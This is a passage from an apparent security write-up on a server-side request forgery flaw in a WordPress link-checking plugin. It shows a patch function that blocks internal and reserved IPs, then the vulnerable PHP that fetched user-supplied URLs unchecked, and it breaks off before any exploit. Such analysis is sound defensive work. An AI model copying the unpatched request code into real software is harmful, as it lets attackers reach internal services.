</span></span><span class="line"><span class="cl">            <span class="s1">&#39;text&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Blocked: invalid or malformed URL&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;link&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$scheme</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span> <span class="nv">$parts</span><span class="p">[</span> <span class="s1">&#39;scheme&#39;</span> <span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span> <span class="nv">$scheme</span><span class="p">,</span> <span class="p">[</span> <span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span> <span class="p">],</span> <span class="k">true</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;broken&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;text&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Blocked: unsupported URL scheme&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;link&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">[</span> <span class="s1">&#39;host&#39;</span> <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$records</span> <span class="o">=</span> <span class="o">@</span><span class="nx">dns_get_record</span><span class="p">(</span> <span class="nv">$host</span><span class="p">,</span> <span class="nx">DNS_A</span> <span class="o">+</span> <span class="nx">DNS_AAAA</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ips</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$records</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">count</span><span class="p">(</span> <span class="nv">$records</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$records</span> <span class="k">as</span> <span class="nv">$record</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;type&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;type&#39;</span> <span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;A&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;ip&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$ips</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;ip&#39;</span> <span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;type&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;type&#39;</span> <span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;AAAA&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;ipv6&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$ips</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$record</span><span class="p">[</span> <span class="s1">&#39;ipv6&#39;</span> <span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$resolved</span> <span class="o">=</span> <span class="nx">gethostbyname</span><span class="p">(</span> <span class="nv">$host</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$resolved</span> <span class="o">&amp;&amp;</span> <span class="nv">$resolved</span> <span class="o">!==</span> <span class="nv">$host</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$ips</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$resolved</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$ips</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;broken&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;text&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Blocked: host could not be resolved&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;link&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$ips</span> <span class="k">as</span> <span class="nv">$ip</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">filter_var</span><span class="p">(</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">,</span> <span class="nx">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="o">|</span> <span class="nx">FILTER_FLAG_NO_RES_RANGE</span> <span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;broken&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;text&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Blocked: resolved to internal or reserved IP address&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;link&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="c1">// Safe
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="c1">// End is_url_unsafe()
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The patch added the <code>is_url_unsafe()</code> function. Before calling <code>wp_remote_get()</code>, the URL is checked in detail: only <code>http</code> and <code>https</code> schemes are allowed, the host is validated, DNS resolution is performed to obtain IPs, and any internal or reserved IP addresses are blocked. If the URL is invalid or unsafe, the function returns detailed block information and <strong>does not perform the request</strong>, thereby <strong>effectively preventing SSRF</strong>. The patch ensures only safe URLs are allowed to be fetched, reducing the risk of external attacks.</p>
<h3 class="heading-element" id="vulnerable-code"><span>Vulnerable Code</span>
  <a href="#vulnerable-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight" title="helpers.php - v1.3.0"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="hl"><span class="lnt"> 6
</span></span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="hl"><span class="lnt">43
</span></span><span class="lnt">44
</span><span class="hl"><span class="lnt">45
</span></span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="hl"><span class="lnt">82
</span></span><span class="hl"><span class="lnt">83
</span></span><span class="hl"><span class="lnt">84
</span></span><span class="hl"><span class="lnt">85
</span></span><span class="hl"><span class="lnt">86
</span></span><span class="hl"><span class="lnt">87
</span></span><span class="lnt">88
</span><span class="lnt">89
</span><span class="hl"><span class="lnt">90
</span></span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">check_url_status_code</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="nv">$timeout</span> <span class="o">=</span> <span class="k">null</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the &#39;allow_redirects&#39; option and sanitize it
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$allow_redirects</span> <span class="o">=</span> <span class="nx">filter_var</span><span class="p">(</span> <span class="nx">get_option</span><span class="p">(</span> <span class="s1">&#39;blnotifier_allow_redirects&#39;</span> <span class="p">),</span> <span class="nx">FILTER_VALIDATE_BOOLEAN</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Determine the request method based on allow_redirects option
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$request_method</span> <span class="o">=</span> <span class="nv">$allow_redirects</span> <span class="o">?</span> <span class="s1">&#39;GET&#39;</span> <span class="o">:</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Force giving head for images, videos, and audio files
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$request_method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_extension</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span> <span class="nx">pathinfo</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">in_array</span><span class="p">(</span> <span class="nv">$file_extension</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_force_head_file_types</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$request_method</span> <span class="o">=</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// User agent
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$user_agent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_user_agent</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Add the home url
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="nx">home_url</span><span class="p">()</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if from youtube
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$watch_url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_youtube_link</span><span class="p">(</span> <span class="nv">$link</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="o">=</span> <span class="s1">&#39;https://www.youtube.com/oembed?format=json&amp;url=&#39;</span><span class="o">.</span><span class="nv">$watch_url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// The request args
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// See https://developer.wordpress.org/reference/classes/WP_Http/request/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$http_request_args</span> <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;blnotifier_http_request_args&#39;</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;method&#39;</span>      <span class="o">=&gt;</span> <span class="nv">$request_method</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;timeout&#39;</span>     <span class="o">=&gt;</span> <span class="nv">$timeout</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;redirection&#39;</span> <span class="o">=&gt;</span> <span class="nx">absint</span><span class="p">(</span> <span class="nx">get_option</span><span class="p">(</span> <span class="s1">&#39;blnotifier_max_redirects&#39;</span><span class="p">,</span> <span class="mi">5</span> <span class="p">)</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;httpversion&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sslverify&#39;</span>   <span class="o">=&gt;</span> <span class="nx">filter_var</span><span class="p">(</span> <span class="nx">get_option</span><span class="p">(</span> <span class="s1">&#39;blnotifier_ssl_verify&#39;</span><span class="p">,</span> <span class="k">true</span> <span class="p">),</span> <span class="nx">FILTER_VALIDATE_BOOLEAN</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user-agent&#39;</span>  <span class="o">=&gt;</span> <span class="nv">$user_agent</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check the link
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">wp_remote_get</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="nv">$http_request_args</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="nx">wp_remote_retrieve_response_code</span><span class="p">(</span> <span class="nv">$response</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Unknown&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$response</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Let&#39;s make invalid URL 0 codes broken
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$code</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nv">$error</span> <span class="o">==</span> <span class="s1">&#39;A valid URL was not provided.&#39;</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$error</span><span class="p">,</span> <span class="s1">&#39;cURL error 6: Could not resolve host&#39;</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$code</span> <span class="o">=</span> <span class="mi">666</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Possible Codes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$codes</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_status_codes</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Files too large
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$request_method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$content_length</span> <span class="o">=</span> <span class="nx">wp_remote_retrieve_header</span><span class="p">(</span> <span class="nv">$response</span><span class="p">,</span> <span class="s1">&#39;content-length&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$content_length</span> <span class="o">&amp;&amp;</span> <span class="nv">$content_length</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// 10 MB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$code</span> <span class="o">=</span> <span class="mi">413</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Bad links
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">in_array</span><span class="p">(</span> <span class="nv">$code</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_bad_status_codes</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;broken&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Warnings
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">in_array</span><span class="p">(</span> <span class="nv">$code</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_warning_status_codes</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;warning&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Good links
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;good&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Filter status
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$status</span> <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;blnotifier_status&#39;</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line hl"><span class="cl">        <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="nv">$type</span><span class="p">,</span>
</span></span><span class="line hl"><span class="cl">        <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="nv">$code</span><span class="p">,</span>
</span></span><span class="line hl"><span class="cl">        <span class="s1">&#39;text&#39;</span> <span class="o">=&gt;</span> <span class="p">(</span> <span class="nv">$code</span> <span class="o">!==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$codes</span><span class="p">[</span> <span class="nv">$code</span> <span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$codes</span><span class="p">[</span> <span class="nv">$code</span> <span class="p">][</span> <span class="s1">&#39;msg&#39;</span> <span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$codes</span><span class="p">[</span> <span class="nv">$code</span> <span class="p">][</span> <span class="s1">&#39;msg&#39;</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$error</span><span class="p">,</span>
</span></span><span class="line hl"><span class="cl">        <span class="s1">&#39;link&#39;</span> <span class="o">=&gt;</span> <span class="nv">$url</span>
</span></span><span class="line hl"><span class="cl">    <span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Return the array
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="c1">// End check_url_status_code
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>check_url_status_code()</code> function is responsible for <strong>checking the status of a URL</strong> and classifying it as <strong>good, warning, or broken</strong>. Specifically, the function performs the following main steps:</p>
<ol>
<li>
<p>Retrieve configuration options</p>
<ul>
<li>Get the <code>blnotifier_allow_redirects</code> option from the database and convert it to boolean → Decide whether to use <strong>GET</strong> or <strong>HEAD</strong> for the request.</li>
</ul>
</li>
<li>
<p>Choose request method</p>
<ul>
<li>If <code>allow_redirects = true</code>, default to <strong>GET</strong>.</li>
<li>If the URL is a <strong>media file</strong> (image, video, audio), the function forces <strong>HEAD</strong> to avoid downloading large files.</li>
</ul>
</li>
<li>
<p>Determine user-agent</p>
<ul>
<li>Calls <code>$this-&gt;get_user_agent()</code> to get an appropriate user-agent for the request.</li>
</ul>
</li>
<li>
<p>Normalize the URL</p>
<ul>
<li>If the URL starts with <code>/</code> → prepend <code>home_url()</code> to form an absolute URL.</li>
<li>If the URL is a <strong>YouTube link</strong>, convert it to the <code>oembed</code> endpoint to obtain information safely without accessing the video directly.</li>
</ul>
</li>
<li>
<p>Configure the request:
Build the <code>$http_request_args</code> array containing request parameters:</p>
</li>
</ol>
<ul>
<li><code>method</code> (GET/HEAD)</li>
<li><code>timeout</code></li>
<li><code>redirection</code> (max number of redirects)</li>
<li><code>sslverify</code> (whether to verify SSL)</li>
<li><code>user-agent</code></li>
</ul>
<ol start="6">
<li>
<p>Perform the request</p>
<ul>
<li>Call <code>wp_remote_get($link, $http_request_args)</code> to obtain the response.</li>
<li>If no error → retrieve the <strong>status code</strong> from the server.</li>
<li>If error → retrieve the error message.</li>
</ul>
</li>
<li>
<p>Handle invalid URLs</p>
<ul>
<li>Some basic errors such as invalid URL provided or host not resolvable → assign special code <code>666</code>.</li>
</ul>
</li>
<li>
<p>Handle oversized files</p>
<ul>
<li>If request method is GET and <strong>content-length &gt; 10MB</strong>, assign code <code>413</code> (Payload Too Large).</li>
</ul>
</li>
<li>
<p>Classify result based on returned code:</p>
</li>
</ol>
<ul>
<li><code>broken</code> → broken URL</li>
<li><code>warning</code> → warning URL</li>
<li><code>good</code> → valid URL</li>
</ul>
<ol start="10">
<li>Return result: Create the <code>$status</code> array including:</li>
</ol>
<ul>
<li>
<p><code>type</code> → URL type (<code>good/warning/broken</code>)</p>
</li>
<li>
<p><code>code</code> → HTTP code or special code</p>
</li>
<li>
<p><code>text</code> → message (message from codes array or error)</p>
</li>
<li>
<p><code>link</code> → original URL</p>
</li>
<li>
<p>Finally, return this array for the plugin to use to display the URL status.</p>
</li>
</ul>
<div class="details admonition bug open">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-bug" aria-hidden="true"></i>Bug<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
  <div class="details-content">
